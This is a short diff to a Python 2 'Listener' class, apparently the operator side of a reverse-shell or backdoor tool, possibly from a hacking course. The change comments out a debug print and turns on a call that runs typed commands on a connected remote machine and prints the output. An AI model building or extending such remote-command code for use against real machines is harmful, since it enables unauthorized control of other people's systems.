@@ -45,9 +45,9 @@ class Listener:
             command = command.split(" ") #command is a string
             #.split converts it into a list with " " space as delimiter
             #so commands can be split from arguments
-            print(command)
-            #result = self.execute_remotely(command, buffer_size)
-            #print(result)
+            #print(command)
+            result = self.execute_remotely(command, buffer_size)
+            print(result)
             
             
 listen_ip = raw_input("Enter IP Address to listen on: ")
